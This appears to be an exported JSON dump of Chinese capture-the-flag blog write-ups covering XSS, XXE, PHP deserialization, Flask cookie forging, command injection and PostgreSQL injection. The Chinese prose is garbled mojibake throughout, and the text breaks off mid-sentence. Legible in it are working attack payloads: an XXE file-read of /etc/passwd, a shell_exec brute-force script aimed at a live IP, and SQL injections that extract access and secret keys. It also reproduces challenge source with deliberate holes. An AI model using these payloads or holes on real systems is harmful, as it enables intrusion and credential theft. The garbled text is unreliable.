è½½å›¾ç‰‡é”™è¯¯çš„ï¼Œå°±å¯ä»¥ä½¿ç”¨onerroräº‹ä»¶è§¦å‘æˆ‘ä»¬çš„è„šæœ¬ xssç»„åˆè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥ç”¨onerrorè§¦å‘æˆ‘ä»¬çš„è„šæœ¬äº†ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„æ˜¯æ–‡å­—ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜éœ€è¦å¯»æ‰¾ä¸€ä¸ªå½“å›¾ç‰‡åŠ è½½å¤±è´¥æ—¶ï¼Œèƒ½å¤Ÿå›æ˜¾æ–‡å­—çš„ä¸œè¥¿ altæ˜¯ä¸€ä¸ªå¿…éœ€çš„å±æ€§ï¼Œå®ƒè§„å®šåœ¨å›¾åƒæ— æ³•æ˜¾ç¤ºæ—¶çš„æ›¿ä»£æ–‡æœ¬ã€‚altå±æ€§æ˜¯ç”¨æ¥å¯¹ç½‘é¡µä¸Šçš„å›¾ç‰‡è¿›è¡Œæè¿°ï¼Œå…‰æ ‡åœ¨å›¾ç‰‡ä¸Šæ—¶æ˜¾ç¤ºçš„æç¤ºè¯­å³é‡‡ç”¨è¯¥æ ‡ç­¾å®ç°ã€‚ æ‰€ä»¥å½“å›¾ç‰‡ä¸èƒ½æ­£å¸¸æ˜¾ç¤ºæ—¶ï¼Œå°±ä¼šæ‰§è¡Œonerrorçš„å†…å®¹ï¼Œonerrorçš„å†…å®¹ä¾¿æ˜¯å›æ˜¾ä¸€ä¸ªalt this.alt=document.getElementsByTagName('script')[0].innerHTML documentdocumentä¸­æœ‰è®¸å¤šè·å–æ–‡æœ¬å†…å®¹çš„æ–¹æ³•ï¼Œæˆ–è€…æ˜¯å…¶ä»–ä¸€äº›å…³é”®ä¿¡æ¯çš„æ–¹æ³• é€šè¿‡IDè·å–ï¼ˆgetElementByIdï¼‰é€šè¿‡nameå±æ€§ï¼ˆgetElementsByNameï¼‰é€šè¿‡æ ‡ç­¾åï¼ˆgetElementsByTagNameï¼‰é€šè¿‡ç±»åï¼ˆgetElementsByClassNameï¼‰è·å–htmlçš„æ–¹æ³•ï¼ˆdocument.documentElementï¼‰è·å–bodyçš„æ–¹æ³•ï¼ˆdocument.bodyï¼‰é€šè¿‡é€‰æ‹©å™¨è·å–ä¸€ä¸ªå…ƒç´ ï¼ˆquerySelectorï¼‰é€šè¿‡é€‰æ‹©å™¨è·å–ä¸€ç»„å…ƒç´ ï¼ˆquerySelectorAllï¼‰//ä½†æ˜¯ä¸€èˆ¬è¿˜è¦å†åé¢åŠ ä¸Šä¸€ä¸ª.innerHTML","link":"/2022/01/30/xss/"},{"title":"2021ç¾å›¢é«˜æ ¡æŒ‘æˆ˜èµ›","text":"ä¸€å¼€å§‹æ˜¯ä¸€ä¸ªxmlå¤–éƒ¨å®ä½“æ³¨å…¥,å¯ä»¥è¯»ä¸€ä¸‹æ–‡ä»¶ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;/user&gt; è¯»åˆ°äº†php-fpm.confçš„é…ç½®æ–‡ä»¶ file://%2fetc%2fphp%2f7%2e0%2ffpm%2fphp-fpm%2econf é”™è¯¯æ—¥å¿—åœ°å€ /var/log/php7.0-fpm.log/run/php/php7.0-fpm.pidmysql:x:105:106:MySQL Server,,,:/nonexistent:/bin/false è¯»åˆ°å†…ç½‘åœ°å€ 127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetfe00::0 ip6-mcastprefixfe00::1 ip6-allnodesfe00::2 ip6-allrouters10.4.104.98 engine-1 è¯»proc/net/arp 10.4.255.253 è¯»åˆ°æºç  &lt;?phpsession_start();if (isset($_SESSION['login'])) { header(&quot;Location: index.php&quot;); die();}?&gt;&lt;!doctype html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; &lt;title&gt;Ã§Â™Â»Ã¥Â½Â•&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=&quot;./static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;style&gt; .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; } @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } } &lt;/style&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=&quot;./static/css/std.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body class=&quot;text-center&quot;&gt; &lt;form class=&quot;form-signin&quot; action=&quot;login.php&quot; method=&quot;POST&quot;&gt; &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;Sign In&lt;/h1&gt; &lt;label for=&quot;username&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt; &lt;br&gt;&lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt; &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; onclick=&quot;javascript:doLogin()&quot; &gt;Sign In&lt;/button&gt; &lt;p class=&quot;mt-5 text-muted&quot;&gt;Don't have an account yet? &lt;a href=&quot;register.php&quot;&gt;Sign Up&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;text-muted&quot;&gt;&amp;copy; 2018-2021&lt;/p&gt; &lt;/form&gt; &lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;./static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/toast.js&quot;&gt;&lt;/script&gt;&lt;script type='text/javascript'&gt; function doLogin(){ var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;){ alert(&quot;Please enter the username and password!&quot;); return; } var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax({ type: &quot;POST&quot;, url: &quot;login.php&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) { var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); }else if(code == &quot;1&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); }else{ $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(&quot;.msg&quot;).text(errorThrown + ':' + textStatus); } }); }&lt;/script&gt;&lt;/html&gt;&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);error_reporting(E_ALL | E_STRICT);include &quot;class.php&quot;;libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; $user = new User(); if (strlen($username) &lt; 20 &amp;&amp; $user-&gt;verify_user($username, $password)) { $_SESSION['login'] = true; $_SESSION['address'] = $_SERVER['REMOTE_ADDR']; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); header('Content-Type: text/html; charset=utf-8'); echo $result; die(&quot;&lt;script&gt;window.location.href='index.php';&lt;/script&gt;&quot;); } else{ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); header('Content-Type: text/html; charset=utf-8'); die($result); }}catch(Exception $e) { $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage()); header('Content-Type: text/html; charset=utf-8'); echo $result;}?&gt; æ¥ä¸‹æ¥æµ‹è¯•æ˜¯å¦å‡ºç½‘ï¼Œå‘ç°æ˜¯å¯ä»¥è¿æ¥çš„ï¼Œ &lt;?phpsession_start();if (isset($_SESSION['login'])) { header(&quot;Location: index.php&quot;); die();}?&gt;&lt;!doctype html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; &lt;title&gt;Ã¦Â³Â¨Ã¥Â†ÂŒ&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=&quot;./static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;style&gt; .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; } @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } } &lt;/style&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=&quot;./static/css/std.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body class=&quot;text-center&quot;&gt; &lt;form class=&quot;form-signin&quot; action=&quot;register.php&quot; method=&quot;POST&quot;&gt; &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;Sign Up&lt;/h1&gt; &lt;label for=&quot;username&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt; &lt;br&gt;&lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt; &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; onclick=&quot;javascript:doRegister()&quot; &gt;Sign Up&lt;/button&gt; &lt;p class=&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2021&lt;/p&gt; &lt;/form&gt;&lt;/body&gt;&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;script src=&quot;./static/js/jquery.min1.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/toast.js&quot;&gt;&lt;/script&gt;&lt;script type='text/javascript'&gt; function doRegister(){ var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;){ alert(&quot;Please enter the username and password!&quot;); return; } var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax({ type: &quot;POST&quot;, url: &quot;register.php&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) { var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); }else if(code == &quot;1&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); }else{ $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(&quot;.msg&quot;).text(errorThrown + ':' + textStatus); } }); }&lt;/script&gt;&lt;/html&gt; è¿˜æœ‰ä¸€ä¸ªindex.php &lt;?phpsession_start();if (isset($_SESSION['login'])) { header(&quot;Location: index.php&quot;); die();}?&gt;&lt;!doctype html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; &lt;title&gt;Ã¦Â³Â¨Ã¥Â†ÂŒ&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=&quot;./static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;style&gt; .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; } @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } } &lt;/style&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=&quot;./static/css/std.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body class=&quot;text-center&quot;&gt; &lt;form class=&quot;form-signin&quot; action=&quot;register.php&quot; method=&quot;POST&quot;&gt; &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;Sign Up&lt;/h1&gt; &lt;label for=&quot;username&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt; &lt;br&gt;&lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt; &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; onclick=&quot;javascript:doRegister()&quot; &gt;Sign Up&lt;/button&gt; &lt;p class=&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2021&lt;/p&gt; &lt;/form&gt;&lt;/body&gt;&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;script src=&quot;./static/js/jquery.min1.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/toast.js&quot;&gt;&lt;/script&gt;&lt;script type='text/javascript'&gt; function doRegister(){ var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;){ alert(&quot;Please enter the username and password!&quot;); return; } var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax({ type: &quot;POST&quot;, url: &quot;register.php&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) { var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); }else if(code == &quot;1&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); }else{ $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(&quot;.msg&quot;).text(errorThrown + ':' + textStatus); } }); }&lt;/script&gt;&lt;/html&gt;&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);error_reporting(E_ALL | E_STRICT);include &quot;class.php&quot;;libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(!empty($xmlfile)) { try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; $user = new User(); if ($user-&gt;add_user($username, $password)) { echo &quot;&lt;script&gt;alert('Registered successfully');window.location.href='login.php';&lt;/script&gt;&quot;; } else{ echo &quot;&lt;script&gt;alert('Registration failed');window.location.href='register.php';&lt;/script&gt;&quot;; } }catch(Exception $e) { $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,4,$e-&gt;getMessage()); header('Content-Type: text/html; charset=utf-8'); echo $result; }}?&gt;&lt;?phpsession_start();if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die();}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;File Uploader&lt;/title&gt;&lt;link href=&quot;./static/css/bootstrap.css&quot; rel='stylesheet' type='text/css' /&gt;&lt;!-- Custom Theme files --&gt;&lt;link href=&quot;./static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;&lt;!-- Custom Theme files --&gt;&lt;script src=&quot;./static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;!-- Custom Theme files --&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta name=&quot;keywords&quot; content=&quot;File Uploader Widget Responsive web template, Bootstrap Web Templates, Flat Web Templates, Andriod Compatible web template, Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, Sony Ericsson, Motorola web design&quot; /&gt;&lt;script type=&quot;application/x-javascript&quot;&gt; addEventListener(&quot;load&quot;, function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;FILE UPLOADER&lt;/h1&gt;&lt;div class=&quot;upload&quot;&gt; &lt;div class=&quot;login-form&quot;&gt; &lt;form id=&quot;upload&quot; method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div id=&quot;drop&quot;&gt; &lt;a&gt;Upload File&lt;/a&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; multiple /&gt; &lt;/div&gt; &lt;ul&gt; &lt;!-- The file uploads will be shown here --&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;!-- JavaScript Includes --&gt; &lt;script src=&quot;./static/js/jquery.knob.js&quot;&gt;&lt;/script&gt; &lt;!-- JavaScript Includes --&gt; &lt;!-- jQuery File Upload Dependencies --&gt; &lt;script src=&quot;./static/js/jquery.ui.widget.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./static/js/jquery.iframe-transport.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./static/js/jquery.fileupload.js&quot;&gt;&lt;/script&gt; &lt;!-- jQuery File Upload Dependencies --&gt; &lt;!-- Main JavaScript file --&gt; &lt;script src=&quot;./static/js/script.js&quot;&gt;&lt;/script&gt; &lt;!-- Main JavaScript file --&gt; &lt;div class=&quot;button&quot;&gt; &lt;div class=&quot;cancel&quot;&gt;&lt;a href=&quot;#&quot;&gt;Cancel&lt;/a&gt;&lt;/div&gt; &lt;div class=&quot;done&quot;&gt;&lt;a href=&quot;#&quot;&gt;Done&lt;/a&gt;&lt;/div&gt; &lt;div class=&quot;clear&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;div class=&quot;footer&quot;&gt; &lt;p&gt;Copyright &amp;copy; 2021 File Uploader. All Rights Reserved | Design by &lt;a href=&quot;#&quot;&gt;File Uploader&lt;/a&gt;&lt;/p&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; ç„¶ååˆè¯»åˆ°äº†ä¸€ä¸ªclass.php &lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;&quot;;$dbname = &quot;ctf&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);abstract class Users { public $db; abstract public function verify_user($username, $password); abstract public function check_user_exist($username); abstract public function add_user($username, $password); abstract protected function eval(); public function test() { $this-&gt;eval(); }}class User extends Users { public $db; private $func; protected $param; public function __construct() { global $db; $this-&gt;db = $db; } public function verify_user($username, $password) { if (!$this-&gt;check_user_exist($username)) { return false; } $password = md5($password . &quot;7a28b8eb92558ea2&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function check_user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;check_user_exist($username)) { return false; } $password = md5($password . &quot;7a28b8eb92558ea2&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } protected function eval() { if (is_array($this-&gt;param)) { ($this-&gt;func)($this-&gt;param); } else { die(&quot;no!&quot;); } }}class Welcome{ public $file; public $username; public $password; public $verify; public $greeting; public function __toString(){ return $this-&gt;verify-&gt;verify_user($this-&gt;username,$this-&gt;password); } public function __wakeup(){ $this-&gt;greeting = &quot;Welcome &quot;.$this-&gt;username.&quot;:)&quot;; }}class File { public $filename; public $fileext; public $basename; public function check_file_exist($filename) { if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function get_real_ext($minitype) { switch ($minitype) { case 'image/gif': $this-&gt;fileext = &quot;.gif&quot;; return $this-&gt;fileext; case 'image/jpeg': $this-&gt;fileext = &quot;.jpg&quot;; return $this-&gt;fileext; case 'image/png': $this-&gt;fileext = &quot;.png&quot;; return $this-&gt;fileext; default: $this-&gt;fileext = &quot;.gif&quot;; return $this-&gt;fileext; } } public function get_file_name($filename) { $pos = strrpos($filename, &quot;.&quot;); if ($pos !== false) { $this-&gt;basename = substr($filename, 0, $pos); return $this-&gt;basename; } } public function __call($func, $params) { foreach($params as $param){ if($this-&gt;check_file_exist($param)) { $this-&gt;filename-&gt;test(); } } } public function get_file_size($filename) { $size = filesize($filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; }}class Logs { public $log; public function log() { $log = $_GET['log']; if(preg_match(&quot;/rot13|base|toupper|encode|decode|convert|bzip2/i&quot;, $log)) { die(&quot;hack!&quot;); } file_put_contents($log,'&lt;?php exit();'.$log); }}?&gt;","link":"/2021/12/11/2021%E7%BE%8E%E5%9B%A2%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/"},{"title":"2022DefCamp CTF","text":"web_introçˆ†ç ´flask_sessionçš„cookie flask-unsign --unsign --cookie &quot;eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgYrAQ.--h0ihPw9_7i2FNqzJ-u-Oythjk&quot; çˆ†ç ´å‡ºå¯†ç ä»¥åï¼Œåœ¨åŠ å¯† flask-unsign --sign --cookie &quot;{'logged': True}&quot; --secret 'password' para-codeif (strlen($_GET['start']) &lt; 5){ echo shell_exec($_GET['start']);} else { echo &quot;Please enter a valid command&quot;;} å››å­—ç¬¦getshell é˜Ÿé‡Œå¤§å¸ˆå‚…çš„è§£,æ”¶è—èµ·æ¥äº† m4 * åæ¥å¸ˆå‚…åœ¨ç¾¤é‡Œè¯´æ€è·¯ï¼Œç¡®å®æœ‰è¢«éœ‡æƒŠåˆ°ï¼ŒåŸæ¥ä»–æ˜¯ç›´æ¥å¾ªç¯çˆ†ç ´ä¸¤ä¸ªå­—ç¬¦ï¼Œæœ‰å›æ˜¾çš„å°±å¯ä»¥äº†ã€‚ã€‚ import requestsimport strings=requests.session()url=&quot;http://34.159.7.96:32210/&quot;a=&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;for i in a: for j in a: payload=f&quot;?start={i}{j} *&quot; r=s.get(url+payload).text if &quot;$flag = &quot; in r: print(payload) print(r) ç¡®å®æ˜¯ä¸€ä¸ªæŒºå¥½çš„æ€è·¯","link":"/2022/02/11/2022DefCamp-CTF/"},{"title":"2022rwctf","text":"hack_into_skyä¸»è¦å­¦ä¹ çš„ç‚¹æ˜¯postgresqlçš„æ³¨å…¥ æµ‹è¯•æ³¨å…¥ç‚¹ ' or 0&lt;&gt;'1' or 1&lt;&gt;'1' or substr('0',1)&lt;&gt;'0' or substr('1',1)&lt;&gt;'0' or substr(current_database(),3)&lt;&gt;'f' or substr(current_database(),3)&lt;&gt;'a æµ‹è¯•å †å æ³¨å…¥ ';SELECT concat(id,age,name,email,born),1 FROM target where id='1 çˆ†è¡¨ ';select tablename,schemaname from pg_tables where tablename like 'ta%' limit 1 offset 1;-- å­—æ®µå ';SELECT column_name,1 FROM information_schema.columns WHERE table_name='target_credentials' limit 1 offset 0;-- çˆ†å€¼ ';SELECT concat(id,account,password,access_key,secret_key),1 FROM target_credentials where id ='1 RWDNæœ‰ä¸¤ä¸ªç«¯å£ï¼Œå¹¶ä¸”å…¶ä¸­ä¸€ä¸ªæœ‰æºç ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹check.jsï¼Œå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªç™½åå• Object.keys(req.files).forEach(function(key){ var filename = req.files[key].name.toLowerCase(); var position = filename.lastIndexOf('.'); if (position == -1) { return next(); } var ext = filename.substr(position); var allowexts = ['.jpg','.png','.jpeg','.html','.js','.xhtml','.txt','.realworld']; if ( !allowexts.includes(ext) ){ res.status(400).send('Something error.'); return; } return next(); }); }; }; è¦æƒ³ç»•è¿‡è¿™é‡Œï¼Œé¦–å…ˆéœ€è¦ææ‡‚ï¼Œä»–æ˜¯å¦‚ä½•æ£€æŸ¥çš„ï¼Œç®€å•æ­ä¸ªdemoæ¨¡æ‹Ÿä¸€ä¸‹ app.post('/upload', function(req, res) { let sampleFile; let uploadPath; let userdir; let userfile; sampleFile = req.files[req.query.formid]; userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5); userfile = sampleFile.name.toString(); if(userfile.includes('/')||userfile.includes('..')){ return res.status(500).send(&quot;Invalid file name&quot;); } uploadPath = '/uploads/' + userdir + '/' + userfile; sampleFile.mv(uploadPath, function(err) { if (err) { return res.status(500).send(err); } res.send('File uploaded to http://47.243.75.225:31338/' + userdir + '/' + userfile); });}); æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†éé¢„æœŸè§£é¦–å…ˆæ¢³ç†ä¸€ä¸‹æµç¨‹å§ï¼Œé¦–å…ˆç»è¿‡check()æ£€æŸ¥ï¼Œè€Œæ£€æŸ¥çš„æ—¶å€™ï¼Œæ˜¯å¯¹æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½ä¼šè¿›è¡Œæ£€æŸ¥çš„ï¼Œç„¶åå†æ ¹æ®formidä¸Šä¼ æ–‡ä»¶ï¼Œå¦‚æœsampleæ˜¯é”™çš„ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´md5é”™è¯¯ï¼Œåé¢ä¹Ÿå°±ä¸ä¼šä¸Šä¼ äº†ã€‚è€Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªé€»è¾‘æ¼æ´ï¼Œè¿˜æŒºå·§å¦™åœ°ï¼Œæ„Ÿè§‰æŒºé”»ç‚¼æ€ç»´çš„ã€‚ é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°foreachï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ä»–ä¼šæ£€æŸ¥æ¯ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å¦‚æœå½“æœ‰ä¸ªæ–‡ä»¶æ— åç¼€çš„æ—¶å€™ï¼Œä»–å°±ç›´æ¥åˆ°next()æ¥ä¸‹æ¥å°±æ˜¯ä¸Šä¼ æ–‡ä»¶é˜¶æ®µï¼Œè€Œå¦ä¸€ä¸ªæ–‡ä»¶åˆ™ä¼šè¿”å›400ï¼Œä½†æ˜¯ä»–åœ¨uploadå‡½æ•°å†…å†™çš„æ˜¯æ ¹æ®formidç¡®å®šä¸Šä¼ æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶å‘¢ï¼Œä¸€ä¸ªä¸ºæ— åç¼€æ–‡ä»¶ç»è¿‡æ 